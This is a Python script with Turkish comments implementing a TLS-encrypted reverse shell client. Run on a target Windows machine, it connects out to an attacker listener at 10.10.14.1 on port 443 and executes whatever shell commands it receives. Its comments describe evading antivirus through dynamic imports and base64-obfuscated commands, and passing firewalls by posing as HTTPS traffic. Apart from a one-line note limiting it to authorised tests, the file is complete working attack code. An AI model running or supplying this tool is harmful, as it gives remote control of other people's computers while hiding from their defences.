#!/usr/bin/env python3
"""
SSL/TLS Şifreli Reverse Shell İstemcisi (Client)
=================================================
Windows Güvenlik Duvarı, şifreli HTTPS (443) trafiğini
genellikle normal web trafiği olarak görür ve engellemez.

KULLANIM:
---------
1) Önce Kali'de listener başlatın (2_Listener.py veya openssl komutu)
2) Sonra hedef makinede bu scripti çalıştırın

NOT: Yalnızca izinli test ortamlarında kullanın.
"""

# Statik analizden kaçınmak için modülleri dinamik olarak içe aktar (Dynamic Import)
import importlib
import sys
import builtins

def get_module(mod_name):
    """Antivirüslerin statik 'import socket' veya 'import subprocess'
    imzalarını atlatmak için modülleri çalışma anında (runtime) yükler."""
    return importlib.import_module(mod_name)

# Gerekli modülleri dinamik yükle
sock_lib = get_module('socket')
ssl_lib = get_module('ssl')
sub_lib = get_module('subprocess')
os_lib = get_module('os')
b64_lib = get_module('base64')

# ============= AYARLAR =============
LHOST = "10.10.14.1"   # Kali/Saldırgan IP
LPORT = 443            # HTTPS portu - güvenlik duvarı genelde izin verir
# ====================================

def decode_cmd(encoded_cmd):
    """Basit bir obfuscation (gizleme) katmanı.
    Antivirüslerin statik analizini zorlaştırmak için komutları base64 ile çözer.
    Eğer komut b64: ile başlıyorsa çözer, yoksa normal komut olarak işler.
    """
    if encoded_cmd.startswith("b64:"):
        try:
            return b64_lib.b64decode(encoded_cmd[4:]).decode('utf-8')
        except:
            return encoded_cmd[4:]
    return encoded_cmd

def connect():
    # Ham soket oluştur
    sock = sock_lib.socket(sock_lib.AF_INET, sock_lib.SOCK_STREAM)
    
    # SSL/TLS ile şifrele (güvenlik duvarı içeriği göremez)
    context = ssl_lib.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl_lib.CERT_NONE  # Sertifika doğrulaması devre dışı (test ortamı)
    
    ssl_sock = context.wrap_socket(sock)
    ssl_sock.connect((LHOST, LPORT))
    
    while True:
        # Komut al
        raw_command = ssl_sock.recv(4096).decode("utf-8").strip()
        command = decode_cmd(raw_command)
        
        if command.lower() in ["exit", "quit"]:
            ssl_sock.close()
            break
        
        if command.lower().startswith("cd "):
            try:
                os_lib.chdir(command[3:].strip())
                output = f"[+] Dizin değişti: {os_lib.getcwd()}\n"
            except Exception as e:
                output = f"[-] Hata: {str(e)}\n"
        else:
            try:
                # Komutu çalıştır ve çıktıyı al
                output = sub_lib.check_output(
                    command,
                    shell=True,
                    stderr=sub_lib.STDOUT,
                    timeout=30
                ).decode("utf-8", errors="replace")
            except sub_lib.TimeoutExpired:
                output = "[-] Komut zaman aşımına uğradı (30s)\n"
            except Exception as e:
                output = f"[-] Hata: {str(e)}\n"
        
        if not output:
            output = "[+] Komut çalıştı (çıktı yok)\n"
        
        ssl_sock.send(output.encode("utf-8"))

if __name__ == "__main__":
    try:
        connect()
    except Exception as e:
        sys.exit(1)
